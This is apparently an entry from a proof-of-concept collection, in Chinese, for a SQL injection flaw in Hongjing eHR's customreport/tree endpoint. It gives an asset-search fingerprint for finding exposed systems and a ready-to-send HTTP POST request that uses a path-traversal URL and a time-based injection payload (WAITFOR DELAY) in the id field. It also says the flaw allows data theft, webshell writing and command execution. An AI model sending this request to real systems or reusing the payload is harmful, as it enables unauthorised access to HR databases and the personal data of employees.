﻿# 宏景eHR customreporttree SQL注入漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：宏景eHR customreport/tree SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

> 漏洞特征：app="HJSOFT-HCM"

> 验证脚本：HTTP

```
POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=1';WAITFOR DELAY '0:0:5'--+&codeset=UN&priv=1&level=


```

> 响应代码特征：999

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：宏景eHR customreporttree SQL注入漏洞.poc

